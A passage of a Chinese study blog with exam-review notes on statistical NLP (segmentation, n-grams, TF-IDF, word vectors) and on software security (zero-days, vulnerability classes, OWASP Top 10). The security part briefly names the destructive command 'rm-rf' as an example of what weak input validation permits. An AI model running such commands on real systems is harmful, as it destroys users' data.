<h1 id="NLP-自然语言处理"><a href="#NLP-自然语言处理" class="headerlink" title="NLP 自然语言处理"></a>NLP 自然语言处理</h1><h2 id="自然语言的特征"><a href="#自然语言的特征" class="headerlink" title="自然语言的特征"></a>自然语言的特征</h2><ul>
<li><p><strong>基于规则的特征</strong></p>
<ol>
<li>固定的语法结构或词性分布</li>
<li>固定的谓词逻辑规则</li>
<li>通用的前缀、后缀</li>
</ol>
</li>
<li><p><strong>基于统计的特征</strong></p>
<ol>
<li>基于大规模语料的特征， 如频率特征  </li>
<li>基于词的编辑距离衡量的词相似性度量</li>
</ol>
</li>
<li><p><strong>基于语言结构的特征</strong></p>
<ol>
<li>词性特征  </li>
<li>命名实体特征</li>
</ol>
</li>
<li><p><strong>其他可用特征</strong></p>
<ol>
<li>词频特征</li>
<li>词的共现频率（见N-Gram）</li>
<li>虚词个数</li>
<li>词性特征</li>
<li>句子的句法、文法特征</li>
<li>句子长度</li>
<li>词编辑距离特征等</li>
<li>词情感特征（否定、肯定等）</li>
</ol>
</li>
</ul>
<h2 id="如何提取特征"><a href="#如何提取特征" class="headerlink" title="如何提取特征"></a>如何提取特征</h2><h3 id="分词"><a href="#分词" class="headerlink" title="分词"></a>分词</h3><ul>
<li><p>基于<strong>字符串匹配</strong>的分词</p>
<ol>
<li><strong>正向最大规则匹配</strong>（从左到右）；</li>
<li><strong>逆向最大规则匹配</strong>（从右到左）；</li>
<li><strong>最少切分</strong>（使每一句中切出的词数最小）；</li>
<li><strong>双向最大规则匹配</strong>：将正向最大匹配法与逆向最大匹配法组合。先根据标点对文档进行粗切分，把文分解成若干个句子，然后再对这些句子用正向最大匹配法和逆向最大匹配法进行扫描切分。如果两种分词方法得到的匹配结果相同， 则认为分词正确，否则，按最小集处理（最少切分）  。</li>
<li><strong>最佳匹配算法</strong><ul>
<li>实现方向：在词典中按词频的大小顺序排列词条，以求缩短对分词词典的检索时间，达到最佳效果，从而降低分词的时间复杂度，加快分词速度。</li>
<li>缺点：其空间复杂度有所增加。</li>
<li>优点：对提高分词精度没有影响，分词处理的时间复杂度有所降低。</li>
</ul>
</li>
</ol>
</li>
<li><p>基于<strong>理解</strong>的分词（又称基于人工智能的分词）</p>
<ol>
<li>其基本思想就是在分词的同时进行句法、语义分析，利用句法信息和语义信息来处理歧义现象。它通常包括三个部分：分词子系统、 句法语义子系统和总控部分。</li>
<li>专家系统分词法；</li>
<li>神经网络分词法；</li>
<li>神经网络专家系统集成式分词法；</li>
</ol>
</li>
<li><p>基于<strong>统计</strong>的分词（又称无字典分词）</p>
<ol>
<li>基本思想：词是稳定的组合，因此在上下文中，相邻的字同时出现的次数越多，就越有可能构成一个词。 因此字与字相邻出现的概率或频率能较好反映成词的可信度。可以对训练文本中相邻出现的各个字的组合的频度进行统计，计算它们之间的互现信息。互现信息体现了汉字之间结合关系的紧密程度。当紧密程度高于某一个阈值时，便可以认为此字组可能构成了一个词。</li>
<li>主要统计模型：N 元文法模型、隐Markov模型和最大熵模型等。</li>
<li>在实际应用中一般是将其与基于词典的分词方法结合起来，既发挥匹配分词切分速度快、效率高的特点，又利用了无词典分词结合上下文识别生词、自动消除歧义的优点。</li>
</ol>
</li>
</ul>
<h3 id="停用词"><a href="#停用词" class="headerlink" title="停用词"></a>停用词</h3><p>什么是停用词？</p>
<p>功能词：”the”、”is”、”at”、”which”、”on”、的、是 等等。</p>
<p>词汇词：”want”等</p>
<p>去停用词是在自然语言处理中常用的过程之一，其目的<strong>在于将句子中的无意义的词过滤</strong>。</p>
<h3 id="命名实体识别（NER，Named-Entity-Recognition-）"><a href="#命名实体识别（NER，Named-Entity-Recognition-）" class="headerlink" title="命名实体识别（NER，Named Entity Recognition ）"></a>命名实体识别（NER，Named Entity Recognition ）</h3><p>NER，即命名实体识别，所谓的命名实体就是人名、机构名、地名以及其他所有以名称为标识的实体，也包括日期、货币等。 </p>
<p>注：命名实体的定义与其处理的问题有关，如在医学领域，药物名、疾病名也是命名实体。 </p>
<p>方法： </p>
<ul>
<li><p><strong>基于规则</strong>：</p>
<ul>
<li><p>借助语言学专家，对自然语言中命名实体出现的规则进行总结，并编写模板，使用模板匹配实体。  </p>
</li>
<li><p><strong>弊端</strong>：</p>
<ul>
<li>仅适用于规律确定的实体； </li>
<li>需要领域专家制定规则； </li>
<li>规则不全面，无法最大限度识别实体。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>基于统计</strong>：</p>
</li>
<li><p><strong>优点</strong>：避免了规则的构造和提取；利用统计规律，更具通用性；统计模型更加容易实现自动化。</p>
</li>
</ul>
<h3 id="其他处理过程"><a href="#其他处理过程" class="headerlink" title="其他处理过程"></a>其他处理过程</h3><ul>
<li>词根化（针对非汉语，如英语）；</li>
<li>去时态化（针对非汉语，如英语）； </li>
<li>语义角色标注（SRL）； </li>
<li>CFG（上下文无关文法）； </li>
<li>句法树等。</li>
</ul>
<h2 id="马尔可夫链"><a href="#马尔可夫链" class="headerlink" title="马尔可夫链"></a>马尔可夫链</h2><h3 id="马尔科夫链"><a href="#马尔科夫链" class="headerlink" title="马尔科夫链"></a>马尔科夫链</h3><p><strong>定义</strong>：马尔可夫链（Markov Chain, MC）是概率论和数理统计中具有马尔可夫性质（Markov property）且存在于离散的指数集（index set）和状态空间（state  space）内的随机过程（stochastic process）。 </p>
<p><strong>特点</strong>：时间、状态都离散。 </p>
<p>在马尔可夫链中，随机变量的状态转换不具备记忆性，即当前的状态仅与前一刻的状态有关。以数学表达式表示则为：<br>$$<br>p(X_{t+1} \mid X_t,…,X_1) &#x3D; p(X_{t+1} \mid X_t)<br>$$<br>在马尔可夫的推广中，可将该规则推广到𝑛阶，称为𝑛-阶马尔可夫链，传统的马尔可夫链称为1-阶马尔可夫。<br>$$<br>p(X_{t+1} \mid X_t,…,X_1) &#x3D; p(X_{t+1} \mid X_t,…,X_K),1&lt;K&lt;t<br>$$<br>马尔可夫链计算（基于当前状态，计算未来状态的概率）：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250108213715511.png" alt="image-20250108213715511"></p>
<p>如上式，$P_{ij}$表示从状态i转化为状态j的概率，则可计算第二天的各天气概率。</p>
<h3 id="N-Gram模型"><a href="#N-Gram模型" class="headerlink" title="N-Gram模型"></a>N-Gram模型</h3><p>在基于统计的分词中，N-Gram模型是一个较为常用且简单的模型，其中N-Gram模型关注的主要特征为<strong>词的共现特征，即共现频率高的多个字其更有可能组成一个词</strong>，如 “人”和“民”，其通常一起出现，被称为<strong>共现</strong>，因此“人民”可作为一个词的切分。</p>
<p>n-gram指的是文本中连续出现的n个词（或字符）序列。例如，给定一句话 “I love natural language processing”，我们可以构造不同的n-gram模型：</p>
<ul>
<li>unigram（只考虑相邻的1个词共现）</li>
<li>bigram（只考虑相邻的2个词共现）</li>
<li>trigram（只考虑相邻的3个词共现）</li>
</ul>
<p><strong>以bigram为例：</strong></p>
<p>假设我们有以下语料库：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">“今天 天气 很 好 今天 心情 很 好 天气 真 不错”</span><br></pre></td></tr></table></figure>

<p>目标是基于这段语料库计算以下句子的概率：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">“今天 天气 很 好”</span><br></pre></td></tr></table></figure>

<p>构造马尔科夫链的转移矩阵：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250108165420108.png" alt="image-20250108165420108"></p>
<p>句子的概率是所有条件概率的乘积：<br>$$<br>P(\text{“今天 天气 很 好”})&#x3D;P(\text{天气}\mid\text{今天})\cdot P(\text{很}\mid\text{天气})\cdot P(\text{好}\mid\text{很})<br>$$<br>代入计算：<br>$$<br>P(\text{“今天 天气 很 好”})&#x3D;0.5 * 0.5 * 1&#x3D;0.25<br>$$</p>
<h3 id="隐马尔可夫链"><a href="#隐马尔可夫链" class="headerlink" title="隐马尔可夫链"></a>隐马尔可夫链</h3><p>不考</p>
<h2 id="词间相似度"><a href="#词间相似度" class="headerlink" title="词间相似度"></a>词间相似度</h2><h3 id="词的编辑距离"><a href="#词的编辑距离" class="headerlink" title="词的编辑距离"></a>词的编辑距离</h3><p>词的编辑距离，描述了一个词变为另一个词所需的操作次数，从某种程度而言，可以作为词于词之间的相似性。</p>
<p>操作包括：插入、删除、替换。</p>
<p><strong>对于中文无较好支持</strong>。由于英文由字母组成，其编辑距离可由字母变换计算，而中文无法实现。</p>
<h3 id="余弦相似度"><a href="#余弦相似度" class="headerlink" title="余弦相似度"></a>余弦相似度</h3><p>$$<br>similarity&#x3D;\cos(\theta)&#x3D;\frac{A \cdot B}{||A|| \cdot||B||}&#x3D;\frac{\Sigma_{i&#x3D;1}^{n}(A_i\times B_i)}{\sqrt{\Sigma_{i&#x3D;1}^{n}(A_i)^2} \times \sqrt{\Sigma_{i&#x3D;1}^{n}(B_i)^2}}<br>$$</p>
<h3 id="Tanimoto系数（广义Jaccard相似系数"><a href="#Tanimoto系数（广义Jaccard相似系数" class="headerlink" title="Tanimoto系数（广义Jaccard相似系数)"></a>Tanimoto系数（广义Jaccard相似系数)</h3><p>$$<br>T(A,B)&#x3D;\frac{A \cdot B}{||A||^2 + ||B||^2-A \cdot B}&#x3D;\frac{\Sigma A_i B_i}{\sqrt{\Sigma A_i^2}+\sqrt{\Sigma B_i^2}-\Sigma A_i B_i}<br>$$</p>
<h3 id="词向量化"><a href="#词向量化" class="headerlink" title="词向量化"></a>词向量化</h3><p>词向量化技术（在深度学习领域通常称为词嵌入），能够将自然语言中的词转化为可供计算的数学表示（通常是向量）。</p>
<p>若考虑向量的维度为𝑚， 则可以使用𝑚范数距离计算向量之间的距离，表示词间距离。 </p>
<p>使用ID编码的词（不使用词向量化）：每个词对应一个唯一的数值型ID。</p>
<p>缺点：数值型计算无法反映词的真实距离</p>
<p>常用词向量次数：One-Hot、词袋模型（BoW）</p>
<h4 id="One-Hot编码"><a href="#One-Hot编码" class="headerlink" title="One-Hot编码"></a>One-Hot编码</h4><p>One-Hot方法：将所有的词使用编码的方式构造一个词典，词典中词的数量作为One-Hot编码的维度数，每个维度表示一个词，每个词在其对应的维度上出现时， 该维度值为1。</p>
<p>例如，给定一个字典，大小为5，有词”你“、”我“、”他“。</p>
<p>编码：你：[1,0,0,0,0]；我：[0,1,0,0,0]；他：[0,0,1,0,0]。</p>
<p>假设使用1-范数距离（曼哈顿距离）来衡量词与词之间的远近，则“你”“我”的距离为2。 此时更换编码顺序，将“你”编码为[0,  0, 0, 1, 0]，此时得到的距离依然为2。</p>
<p><strong>优点：</strong></p>
<ul>
<li>解决了词到数值空间的映射问题；</li>
<li>编码不同，但是计算得到的结果相同;</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>没有考虑词的频率，使得任意两个词之间的距离相同； </li>
<li>矩阵稀疏，维度可能太高，需要降维处理； </li>
<li>没有考虑上下文，词被认为是独立的。</li>
</ul>
<h4 id="Bag-of-Word（BoW）词袋"><a href="#Bag-of-Word（BoW）词袋" class="headerlink" title="Bag of Word（BoW）词袋"></a>Bag of Word（BoW）词袋</h4><p>BoW方法：对所有的词构造词典，形成ID与词的映射。以词典大小作为向量维数， 并统计句子（或文档）中每个词的出现频率，将词的频率填充到向量中对应的维度上得到该句子（或文档）向量。</p>
<p>例如，有两个句子分别为：</p>
<p>s1 &#x3D; “𝐽𝑜ℎ𝑛 𝑙𝑖𝑘𝑒𝑠 𝑡𝑜 𝑤𝑎𝑡𝑐ℎ 𝑚𝑜𝑣𝑖𝑒𝑠,𝑀𝑎𝑟𝑦 𝑙𝑖𝑘𝑒𝑠 𝑚𝑜𝑣𝑖𝑒𝑠 𝑡𝑜𝑜” </p>
<p>s2 &#x3D; “𝐽𝑜ℎ𝑛𝑎𝑙𝑠𝑜𝑙𝑖𝑘𝑒𝑠𝑡𝑜𝑤𝑎𝑡𝑐ℎ𝑓𝑜𝑜𝑡𝑏𝑎𝑙𝑙 𝑔𝑎𝑚𝑒𝑠”</p>
<p>1）构造词典，每个词给定唯一编码，如 1:John，获得词典，大小为10；</p>
<p>2）统计词典中每个词在句子中出现的次数， 如𝑠中movies次数为2； </p>
<p>3）将不同词出现的次数，填充到对应的维度上，得到最终向量。</p>
<p>结果：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250108172157116.png" alt="image-20250108172157116" style="zoom:67%;" />

<p><strong>优点：</strong></p>
<ul>
<li>考虑了词频特征，能够更好地反映词在句子或文档中的分布情况；</li>
<li>基于统计的特征提取，通用性更好； </li>
<li>简单易用，有一定可用性和有效性；</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>不考虑词序特征、文法、句法特征，有信息丢失； </li>
<li>矩阵（向量）稀疏，运算量大；</li>
</ul>
<h2 id="词频与TF-IDF"><a href="#词频与TF-IDF" class="headerlink" title="词频与TF-IDF"></a>词频与TF-IDF</h2><p><strong>词频(Term Frequency, TF)<strong>定义：某个词在语料库中出现的频率，用以表示语料库中各词的分布情况。<br>$$<br>TF(w)&#x3D;\frac{单词w在文章中出现的次数}{文章中单词的总数}<br>$$<br>BoW模型是利用TF特征构建的一种向量化模型。 除词频外，还有另外一个频率，即</strong>逆文本频率(Inverse Document Frequency, IDF)</strong>：<br>$$<br>IDF(w)&#x3D;log(\frac{语料库中文档的总数}{包含词𝑤的文档数+1})<br>$$<br>IDF的作用是降低那些在所有文档中都很常见的词的权重，从而使得在少数文档中出现的词具有较高的权重，代表它们更能区分不同文档。</p>
<p><strong>NLP领域的一个定理：</strong></p>
<p> LAW: Zipf’s Law, given some corpus of natural language utterances, the frequency of any  word is inversely proportional to its rank in the frequency table.  </p>
<p>解释：在一个自然语言语料库中，单词的出现频率与它在频率排名中的位置（即排名靠前的单词出现的频率较高）成反比。具体来说，若将单词按频率排序，排名第一的单词出现的次数大约是排名第二的单词的两倍，排名第二的单词的出现次数大约是排名第三的单词的两倍，以此类推。</p>
<p>根据上述定理，我们可以导出<strong>TF-IDF</strong>定义：<br>$$<br>TF-IDF(w)&#x3D;TF(w) \times IDF(w)<br>$$<br>解决的问题：相比于BoW，其词的分布特征更加准确，TF-IDF值反映了该词在该文档中的重要程度。</p>
<p>TF-IDF能够反映文档中词对文档的贡献度，那么其能应用在哪些领域呢？ </p>
<ol>
<li>文本挖掘领域（Text Mining）； </li>
<li>信息检索领域（InformationRetrieval）</li>
</ol>
<p>TF-IDF的问题：</p>
<ul>
<li>忽略了位置信息，不能完全地进行语义建模； </li>
<li>假设词是独立的，没有考虑上下文信息； </li>
<li>无法处理在文章中出现次数少，但是确是文档内容核心的情况；</li>
</ul>
<h3 id="用TF-IDF构建主题模型"><a href="#用TF-IDF构建主题模型" class="headerlink" title="用TF-IDF构建主题模型"></a>用TF-IDF构建主题模型</h3><p><strong>主题模型（Topic Model）</strong>：一种以非监督学习的方式对文集的隐含语义结构（latent  semantic structure）进行聚类（clustering）的统计模型。</p>
<p>TF-IDF在主题模型中的应用： 计算文档中各词的TF-IDF值，选取TF-IDF高的词作为文档的主题表示。</p>
<p><strong>方法：</strong></p>
<ol>
<li>构建词典； </li>
<li>统计各词在文档、语料库中的TF值及IDF值； </li>
<li>计算TF-IDF值，并倒排序； </li>
<li>选取TF-IDF值高的项，并在词典中查找对应词，作为主题词。</li>
</ol>
<h3 id="词项-文档矩阵（Term-Document-Matrix）"><a href="#词项-文档矩阵（Term-Document-Matrix）" class="headerlink" title="词项-文档矩阵（Term-Document Matrix）"></a>词项-文档矩阵（Term-Document Matrix）</h3><p>通过计算TF-IDF值，来构建矩阵，矩阵中的每个元素值代表了相应行上的词项对应于相应列上的文档的权重，即这个词对于这篇文章来说的重要程度。</p>
<p>基本过程： </p>
<ol>
<li>读入文档； </li>
<li>分词； </li>
<li>建立字典(得到ID:词的映射，ID将作为矩阵行的索引)； </li>
<li>计算TF-IDF值； </li>
<li>得到Term-Document Matrix。</li>
</ol>
<h2 id="共现矩阵"><a href="#共现矩阵" class="headerlink" title="共现矩阵"></a>共现矩阵</h2><p>前面我们提到，TF-IDF和One-Hot编码均有一个弊端：认为词是独立存在，不考虑词的位置信息及上下文信息。 反观N-Gram模型，其建模了词与词之间的关联关系，如2-gram模型中，一个词将考虑 其前一个词的关系，这便是共现特征(Co-occurrence)。</p>
<p>共现矩阵是基于N-Gram思想的又一种模型，其统计了一个词与其他词共同出现的频率，以此来建模词的特征。</p>
<p>例： 设语料库如为：”I like deep learning.”, “I like NLP.” , “I enjoy flying.”，利用bigram求出共现矩阵。</p>
<p>设置窗口大小为1，分别滑动，判断每 个bigram组合的出现频率，如”I like”为 2, “I enjoy”为1，”like deep”为1，依次 滑动窗口，求出所有bigram项的频率。 则有如图所示的共现矩阵。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250108173624034.png" alt="image-20250108173624034"></p>
<p>基于行（或列）的词向量，可以发现，对于 like和enjoy，其欧式距离或1-范数距离较小， 说明两词含义相近，符合预期，可用于比较词与词之间的相似度。</p>
<h2 id="LDA与LSA"><a href="#LDA与LSA" class="headerlink" title="LDA与LSA"></a>LDA与LSA</h2><p>不考</p>
<h2 id="常见的的NLP任务"><a href="#常见的的NLP任务" class="headerlink" title="常见的的NLP任务"></a>常见的的NLP任务</h2><ol>
<li>垃圾邮件、短信识别 </li>
<li>文本相似性判断，用于文本聚类或信息检索  </li>
<li>文本情感分析  </li>
<li>文本质量评估  </li>
<li>文本主题提取</li>
</ol>
<h2 id="信息熵，最大熵模型"><a href="#信息熵，最大熵模型" class="headerlink" title="信息熵，最大熵模型"></a>信息熵，最大熵模型</h2><p> <strong>信息熵</strong>：用于衡量信息的不确定性。对于一个随机变量，其计算方式如下：<br>$$<br>H(X)&#x3D;-\Sigma P(X)\log P(X)<br>$$<br> <strong>最大熵模型</strong>：在满足所有已知条件的情况下，保留最大的不确定性，即保持熵最大。  </p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li>统计模型:理论与实践 - 复习 from Chipsy</li>
<li>统计模型：理论与实践-研（2024）课件</li>
</ul>
]]></content>
      <categories>
        <category>统计模型：理论与实践</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>统计模型</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全2024 期末复习</title>
    <url>/2025/01/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="考试形式"><a href="#考试形式" class="headerlink" title="考试形式"></a>考试形式</h2><p>一共十道简答题，书本——《软件安全技术（陈波）(Z-Library)》上的十章的课后题中每章选一题。</p>
<h2 id="2024期末试卷回忆"><a href="#2024期末试卷回忆" class="headerlink" title="2024期末试卷回忆"></a>2024期末试卷回忆</h2><ol>
<li>什么是零日（0 day）漏洞？什么是零日（0 day）攻击？</li>
<li>试述软件漏洞的概念，谈谈软件漏洞与软件错误、软件缺陷、软件Bug的区别与联系。</li>
<li>分析攻击事件中XSS漏洞的原理。</li>
<li>什么是敏捷SDL？敏捷SDL和经典SDL的主要区别是什么？</li>
<li>软件安全需求的获取方法中的策略分解是指什么？</li>
<li>什么是最小授权原则？试举例说明软件设计时哪些措施是采用了最小授权原则。</li>
<li>安全编译是指在代码编译阶段采取的哪些安全措施？</li>
<li>什么是Rootkit？它与木马和后门有什么区别与联系？</li>
<li>所开发的软件中使用了带GPL许可证的开源软件，那么这个软件是不是就要开源？</li>
<li>试述软件版权的概念。针对软件的版权，有哪些侵权行为？有哪些保护措施？</li>
</ol>
<span id="more"></span>

<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><ol>
<li>零日漏洞、零日攻击：</li>
</ol>
<ul>
<li>零日漏洞是指<strong>未被公开披露的软件漏洞</strong>，软件作者或厂商没来得及为漏洞打补丁或是给出建议解决方案，从而攻击者能够利用这种漏洞破坏计算机程序、数据及设备</li>
<li>零日攻击是指<strong>利用零日漏洞</strong>开发攻击工具进行的攻击。</li>
</ul>
<ol start="2">
<li><strong>为什么必须对软件安全给予强烈关注？</strong></li>
</ol>
<ul>
<li>背景：1️⃣<strong>软件无处不在</strong>，信息化时代软件涉及即时通信、电子邮件、移动商务、智能家居等方面；2️⃣<strong>软件规模日益庞大</strong>，操作系统从百万行增长至亿行。</li>
<li>问题：<strong>软件漏洞普遍存在</strong>，特别是<strong>零日漏洞</strong>以及<strong>不安全的软件配置</strong>等问题。</li>
<li>结论：引起重视，有利于社会、经济和国防建设，国家竞争力。</li>
</ul>
<ol start="3">
<li>零日漏洞反映了软件系统存在什么问题？</li>
</ol>
<ul>
<li>零日漏洞是指<strong>未被公开披露的软件漏洞</strong>，软件作者或厂商来不及为漏洞打补丁或是给出建议解决方案。</li>
<li>因此，零日攻击成功率高，后果严重，可见<strong>软件系统的脆弱性</strong>、<strong>漏洞的隐秘性</strong>、<strong>修复的滞后性</strong>。</li>
</ul>
<ol start="4">
<li>软件安全威胁可以分为哪几类？</li>
</ol>
<ul>
<li>软件自身的安全（软件漏洞）：软件生命周期中与安全相关的设计错误、编码缺陷及运行故障；</li>
<li>恶意代码：在未被授权的情况下，以破坏软硬件设备、窃取用户信息、干扰用户正常使用、扰乱用户心理为目的而编制的软件或代码片段；</li>
<li>软件侵权：计算机软件产品开发完成后复制成本低、复制效率高，所以往往成为版权侵犯的对象；</li>
</ul>
<ol start="5">
<li>试谈谈对软件漏洞的认识，软件漏洞造成危害举例。</li>
</ol>
<ul>
<li>软件漏洞是 软件生命周期中 <strong>与安全相关的</strong> 设计错误、编码缺陷及运行故障等。</li>
<li>一方面，造成软件运行错误或崩溃 （<strong>内部</strong>）：<ul>
<li>操作系统启动没有驱动而<strong>蓝屏</strong>；</li>
<li><strong>内存泄漏</strong>导致内存消耗变大，直至崩溃；</li>
<li>用户<strong>并发过高</strong>，程序运行错误；</li>
<li><strong>多线程</strong>，<strong>资源死锁</strong>，死机；</li>
</ul>
</li>
<li>另一方面，被黑客利用，造成信息泄露和被攻击 （<strong>外部</strong>）：<ul>
<li><strong>明文存储</strong>口令，通过数据库获取；</li>
<li><strong>缓冲区溢出</strong>，被获取权限；</li>
<li><strong>安全验证</strong>不强，被冒充；</li>
<li><strong>输入检查不严格</strong>，被执行系统删除命令rm-rf；</li>
</ul>
</li>
<li>震网病毒，U盘｜局域网，伊朗等核设施，我国500多万网民受攻击。</li>
</ul>
<ol start="6">
<li>什么是恶意代码？有哪些恶意代码类型（除了计算机病毒）？</li>
</ol>
<ul>
<li>恶意代码是<strong>未被授权</strong>情况下，<strong>破坏软硬件，窃取信息，干扰使用</strong> 的 软件或代码；</li>
<li>举例：蠕虫、特洛伊木马、backdoor（柯南）、rookit、流氓软件、勒索软件等；</li>
</ul>
<ol start="7">
<li>哪些行为侵犯软件版权（主体：<strong>软件著作权</strong>人）？</li>
</ol>
<ul>
<li>未经许可，发表、发行、修改、翻译、出租、传播；</li>
<li>复制；</li>
<li>合作 -&gt; 单独；</li>
<li>转让权；</li>
</ul>
<ol start="8">
<li><strong>软件安全概念解释</strong></li>
</ol>
<ul>
<li><strong>软件工程</strong>和<strong>软件保障</strong>的一个方面，提供一种<strong>系统的方法</strong>来分析和追踪 对危害及具有危害性功能的软件缓解措施与控制。</li>
<li>三大基本属性（<strong>CIA</strong>）：保密性Confidentiality、完整性Integrity、可用性Availability。</li>
<li>其他属性：可认证性、授权、可审计性等。</li>
</ul>
<ol start="9">
<li>软件和软件工程概念解释</li>
</ol>
<ul>
<li>软件：计算机程序、数据、文档；</li>
<li>软件工程：用<strong>工程</strong>概念和方法<strong>开发</strong>和<strong>维护</strong>软件，把好的管理技术和技术方法<strong>结合</strong>，经济地<strong>开发</strong>出高质量软件并有效维护。</li>
</ul>
<ol start="10">
<li>软件安全工程较软件工程添加了哪些任务？</li>
</ol>
<ul>
<li>开发安全的代码（C）：开发</li>
<li>安全环境（E）：运行</li>
<li>安全测试（T）：测试</li>
<li>网络安全（W）：上线</li>
<li>安全维护（M）：定期</li>
<li>通过安全标准（S）</li>
<li>安全审计（A）：评估</li>
</ul>
<ol start="11">
<li>谈谈软件安全与软件危机、软件质量和软件质量保障、软件保障、软件可靠性、应用软件系统安全、可信软件和软件定义安全等概念的区别和联系。</li>
</ol>
<ul>
<li>软件危机：软件开发维护中遇到的<strong>严重问题</strong>。</li>
<li>软件质量：软件与明确的和隐含的<strong>定义</strong>需求<strong>相一致的程度</strong>。</li>
<li>软件质量保证：建立一套规范方法，向管理层<strong>保证</strong>这套标准能被所有项目采用。</li>
<li>软件保障：提供一个合理的确信级别，<strong>保证</strong>软件按预期执行，<strong>保证</strong>不被攻击。</li>
<li>软件可靠性：规定时间内<strong>软件不引起系统失效的概率</strong>。</li>
<li>应用软件系统安全：应用系统在信息系统<strong>上层</strong>，其余部分安全首先要确保应用系统安全。</li>
<li>可信软件：具有可信性的软件，可信指行为及结果<strong>可以预期</strong>，目标与实际<strong>相符。</strong></li>
<li>联系：以上都是为了确保软件可靠、可信，保证软件安全。</li>
</ul>
<ol start="12">
<li>确保软件安全的基本思路是什么？软件安全技术涉哪些方面？</li>
</ol>
<ul>
<li>思路1：<strong>事后</strong>挖掘漏洞，分析后修复，例如补丁、防火墙等。性价比低，差。</li>
<li>思路2：<strong>事先</strong>分析可能原因，开发中避免。成本低，好。</li>
<li>涉及哪些方面：<ul>
<li>加密和解密技术</li>
<li>访问控制技术</li>
<li>漏洞扫描修复技术</li>
<li>入侵检测和防御技术</li>
<li>安全审计技术</li>
</ul>
</li>
</ul>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><ol>
<li><strong>软件漏洞的概念，软件漏洞与软件错误、软件缺陷、软件bug的区别和联系。</strong></li>
</ol>
<ul>
<li>漏洞：存在于信息系统、系统安全过程、实现过程中的 容易被攻击 的弱点，往往是软件生命周期中 与安全相关的 设计错误和编码缺陷等。</li>
<li>区别：<ul>
<li>软件错误：软件开发中，人为导致的，包括需求说明错误、设计错误、编码错误、测试错误、配置错误、文档错误等。</li>
<li>软件缺陷&#x2F;Bug：软件产品中，人为&#x2F;客观。静态，激活会影响正常功能。</li>
<li>软件漏洞<strong>隐蔽</strong>，体现软件<strong>脆弱性</strong>。</li>
</ul>
</li>
<li>联系<ul>
<li>都是软件功能、行为 异常&#x2F;错误，<strong>损害了可用性。</strong></li>
</ul>
</li>
</ul>
<ol start="2">
<li>安全缺陷为什么需要考虑具体环境、具体对象？</li>
</ol>
<ul>
<li>安全性功能是软件系统中的安全性需求，是否将安全性功能加入到项目需求中，还需要根据项目的具体情况考虑，如项目经费等。（例如是否使用HTTPS协议）</li>
</ul>
<ol start="3">
<li><strong>软件漏洞成因</strong></li>
</ol>
<ul>
<li>计算机体系结构导致<strong>必然性</strong>；</li>
<li>软件趋向<strong>大型化</strong>，复杂度⬆️软件漏洞⬆️；</li>
<li>新设计<strong>没考虑安全性；</strong></li>
<li><strong>使用场景</strong>更具威胁，网络；</li>
<li><strong>缺乏重视和知识；</strong></li>
</ul>
<ol start="4">
<li><strong>软件漏洞如何分类分级管理？</strong></li>
</ol>
<ul>
<li>分类<ul>
<li>成因：内存破坏类、逻辑错误类、输入验证类等；</li>
<li>位置：本地、远程；</li>
<li>威胁类型：获取控制、获取信息、拒绝服务；</li>
</ul>
</li>
<li>分级<ul>
<li>严重、重要、中等、低；</li>
<li>通用漏洞评分系统（CVSS），基本度量B、时间度量T、环境度量E 打分；</li>
</ul>
</li>
</ul>
<ol start="5">
<li>软件漏洞管理遵循的标准</li>
</ol>
<ul>
<li>CVE、CWE、CPE</li>
<li>CVSS、CWSS</li>
<li>OVAL</li>
</ul>
<ol start="6">
<li>软件漏洞买卖合法吗？软件漏洞如何管控？</li>
</ol>
<ul>
<li>不合法；</li>
<li>如何管控：<ul>
<li>认清漏洞危害，加以<strong>重视；</strong></li>
<li>加强<strong>法律</strong>建设，完善漏洞管理规范；</li>
<li>限制“<strong>白帽</strong>”行为；</li>
</ul>
</li>
</ul>
<ol start="7">
<li>漏洞发布的标准过程：</li>
</ol>
<ul>
<li>识别漏洞：专家、第三方；</li>
<li>评估漏洞：漏洞是咋样的？</li>
<li>修复漏洞：补丁、热更新；</li>
<li>发布信息：跟用户讲；</li>
</ul>
<h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><ol>
<li>常用的Web三层架构是怎样的？</li>
</ol>
<ul>
<li>用户视图层（View）</li>
<li>业务逻辑层（Control）</li>
<li>数据访问层（Model）</li>
</ul>
<ol start="2">
<li>当在浏览器输入完整URL，再按Enter直至页面加载完成，发生了什么？</li>
</ol>
<ul>
<li>DNS解析，TCP连接，HTTP请求，处理请求返回HTTP响应，页面渲染，关闭连接。</li>
</ul>
<ol start="3">
<li>根据OWASP2013发布的Web安全十大威胁报告，web漏洞分为哪几大类型？</li>
</ol>
<ul>
<li><p><strong>注入</strong>；</p>
</li>
<li><p>跨站脚本（<strong>XSS</strong>）；</p>
</li>
<li><p>跨站请求伪造（<strong>CSRF</strong>）；</p>
</li>
<li><p>失效的<strong>身份认证</strong>与会话管理；</p>
</li>
<li><p>不安全的<strong>直接对象引用；</strong></p>
</li>
<li><p>错误的<strong>安全配置；</strong></p>
</li>
<li><p>敏感<strong>数据泄漏；</strong></p>
</li>
<li><p>缺失功能级<strong>访问控制；</strong></p>
</li>
<li><p>使用有<strong>漏洞</strong>组件；</p>
</li>
<li><p>未验证的<strong>重定向和转发；</strong></p>
</li>
</ul>
<ol start="4">
<li>试将Web典型漏洞根据客户端和服务器端来划分，并根据漏洞原理阐述这样划分的理由。</li>
</ol>
<ul>
